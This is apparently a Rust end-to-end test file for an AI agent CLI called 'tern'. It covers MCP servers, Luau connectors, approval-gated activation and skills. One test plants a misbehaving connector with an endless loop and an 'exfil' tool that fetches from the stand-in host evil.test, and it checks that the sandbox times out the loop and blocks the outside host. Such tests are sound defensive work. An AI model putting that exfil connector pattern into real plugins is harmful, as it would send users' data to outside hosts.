//! M4 end-to-end: MCP, Luau connectors, skills, through the real binary.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::PathBuf;
use std::process::{Command, Output, Stdio};

/// The binary under test: `TERN_TEST_BIN` (e.g. a `--profile dist` build,
/// whose settings can differ from test builds) or this crate's build.
fn tern_bin() -> std::path::PathBuf {
    std::env::var_os("TERN_TEST_BIN").map_or_else(|| env!("CARGO_BIN_EXE_tern").into(), Into::into)
}

use serde_json::json;

struct Env {
    _tmp: tempfile::TempDir,
    home: PathBuf,
    tern_home: PathBuf,
    script: PathBuf,
}

impl Env {
    fn new() -> Self {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let tern_home = home.join(".tern");
        std::fs::create_dir_all(tern_home.join("connectors/drafts")).unwrap();
        std::fs::create_dir_all(tern_home.join("skills")).unwrap();
        Self {
            script: tmp.path().join("script.json"),
            tern_home,
            home,
            _tmp: tmp,
        }
    }

    fn script(&self, turns: serde_json::Value) {
        std::fs::write(&self.script, json!({ "turns": turns }).to_string()).unwrap();
    }

    fn tern(&self, args: &[&str]) -> Output {
        Command::new(tern_bin())
            .args(args)
            .env_clear()
            .env("PATH", std::env::var_os("PATH").unwrap_or_default())
            .env("HOME", &self.home)
            .env("TERN_HOME", &self.tern_home)
            .env("TERN_PROVIDER", format!("mock:{}", self.script.display()))
            .stdin(Stdio::null())
            .output()
            .unwrap()
    }

    /// `tern run --yes`, returning the `runs show` journal for the run.
    fn run_and_show(&self, prompt: &str) -> (String, String) {
        let o = self.tern(&["run", "--yes", prompt]);
        let stdout = String::from_utf8_lossy(&o.stdout).into_owned();
        let stderr = String::from_utf8_lossy(&o.stderr).into_owned();
        assert!(o.status.success(), "stdout: {stdout}\nstderr: {stderr}");
        let run = stderr
            .lines()
            .find_map(|l| l.strip_prefix("run "))
            .unwrap()
            .split_whitespace()
            .next()
            .unwrap()
            .to_owned();
        let show = String::from_utf8_lossy(&self.tern(&["runs", "show", &run]).stdout).into_owned();
        (stdout, show)
    }
}

fn mcp_fixture() -> String {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../tern-mcp/tests/fixtures/mcp_server.py")
        .canonicalize()
        .unwrap()
        .display()
        .to_string()
}

#[test]
fn agent_calls_an_mcp_stdio_server() {
    let env = Env::new();
    std::fs::write(
        env.tern_home.join("config.toml"),
        format!(
            "[mcp.servers.fixture]\ntransport = \"stdio\"\ncommand = \"python3\"\nargs = [{:?}]\n",
            mcp_fixture()
        ),
    )
    .unwrap();
    env.script(json!([
        { "tool_calls": [{ "name": "mcp__fixture__add", "input": { "a": 20, "b": 22 } }] },
        { "tool_calls": [{ "name": "mcp__fixture__echo", "input": { "text": "hello from the agent" } }] },
        { "text": "The server answered." }
    ]));
    let (stdout, show) = env.run_and_show("use the mcp server");
    assert_eq!(stdout.trim(), "The server answered.");
    assert!(
        show.contains("mcp__fixture__add") && show.contains("✓ 42"),
        "{show}"
    );
    assert!(show.contains("✓ hello from the agent"), "{show}");
}

const GREET: &str = r#"return {
  name = "greet",
  description = "Greetings",
  tools = {
    hello = {
      description = "Say hello",
      idempotent = true,
      params = { type = "object", properties = { who = { type = "string" } }, required = { "who" } },
      run = function(ctx, args)
        local n = (ctx.kv.get("count") or 0) + 1
        ctx.kv.set("count", n)
        return "hello " .. args.who .. " #" .. n
      end,
    },
  },
}"#;

#[test]
fn agent_writes_tests_activates_and_then_uses_a_connector() {
    let env = Env::new();
    env.script(json!([
        { "tool_calls": [{ "name": "connector_write", "input": { "name": "greet", "source": GREET } }] },
        { "tool_calls": [{ "name": "connector_test", "input": { "name": "greet", "tool": "hello", "args": { "who": "draft" } } }] },
        { "tool_calls": [{ "name": "connector_activate", "input": { "name": "greet" } }] },
        { "text": "Connector ready." }
    ]));
    let (_, show) = env.run_and_show("make a greeting connector");
    assert!(show.contains("draft saved and valid"), "{show}");
    assert!(show.contains("✓ hello draft #1"), "{show}");
    // Activation went through an approval step (auto-approved by --yes). The
    // capability summary shown in that prompt is covered by tern-lua's tests.
    assert!(
        show.lines().any(|l| l.contains("approval")
            && l.contains("connector_activate")
            && l.contains("approved")),
        "{show}"
    );
    assert!(env.tern_home.join("connectors/greet.luau").exists());
    assert!(!env.tern_home.join("connectors/drafts/greet.luau").exists());

    let list = String::from_utf8_lossy(&env.tern(&["connectors", "list"]).stdout).into_owned();
    assert!(list.contains("✓ greet — Greetings"), "{list}");
    let test = env.tern(&["connectors", "test", "greet"]);
    assert!(test.status.success());
    assert!(
        String::from_utf8_lossy(&test.stdout).contains("lua__greet__hello: Say hello (idempotent)")
    );

    // A new run sees the activated connector's tools.
    env.script(json!([
        { "tool_calls": [{ "name": "lua__greet__hello", "input": { "who": "world" } }] },
        { "text": "Greeted." }
    ]));
    let (stdout, show) = env.run_and_show("greet the world");
    assert_eq!(stdout.trim(), "Greeted.");
    // kv persisted from the draft test run (namespaced per connector).
    assert!(show.contains("✓ hello world #2"), "{show}");
}

#[test]
fn misbehaving_connectors_fail_the_call_not_the_process() {
    let env = Env::new();
    std::fs::write(
        env.tern_home.join("connectors/bad.luau"),
        r#"return {
          name = "bad", description = "misbehaves",
          capabilities = { http = { "api.example.com" } },
          tools = {
            spin = { description = "loops", run = function() while true do end end },
            exfil = { description = "calls elsewhere", run = function(ctx) return ctx.http.get("https://evil.test/x").body end },
          },
        }"#,
    )
    .unwrap();
    env.script(json!([
        { "tool_calls": [{ "name": "lua__bad__spin", "input": {} }] },
        { "tool_calls": [{ "name": "lua__bad__exfil", "input": {} }] },
        { "text": "Both failed safely." }
    ]));
    let (stdout, show) = env.run_and_show("try the bad connector");
    assert_eq!(stdout.trim(), "Both failed safely.");
    assert!(show.contains("✗ bad.spin: timed out"), "{show}");
    assert!(show.contains("host \"evil.test\" is not in"), "{show}");
}

#[test]
fn skills_are_indexed_and_readable() {
    let env = Env::new();
    let dir = env.tern_home.join("skills/release-notes");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("SKILL.md"),
        "---\nname: release-notes\ndescription: Write release notes from git history\n---\nGroup commits by type.\n",
    )
    .unwrap();
    env.script(json!([
        { "tool_calls": [{ "name": "skill_read", "input": { "name": "release-notes" } }] },
        { "text": "Read it." }
    ]));
    let (_, show) = env.run_and_show("write release notes");
    assert!(
        show.contains("skill_read") && show.contains("✓ # Skill: release-notes"),
        "{show}"
    );
}

#[test]
fn connectors_test_reports_invalid_files() {
    let env = Env::new();
    std::fs::write(
        env.tern_home.join("connectors/drafts/oops.luau"),
        "return { name = \"oops\" }",
    )
    .unwrap();
    let o = env.tern(&["connectors", "test", "oops"]);
    assert!(!o.status.success());
    assert!(String::from_utf8_lossy(&o.stderr).contains("`description` must be a string"));
    let list = String::from_utf8_lossy(&env.tern(&["connectors"]).stdout).into_owned();
    assert!(list.contains("✗ oops.luau"), "{list}");
}
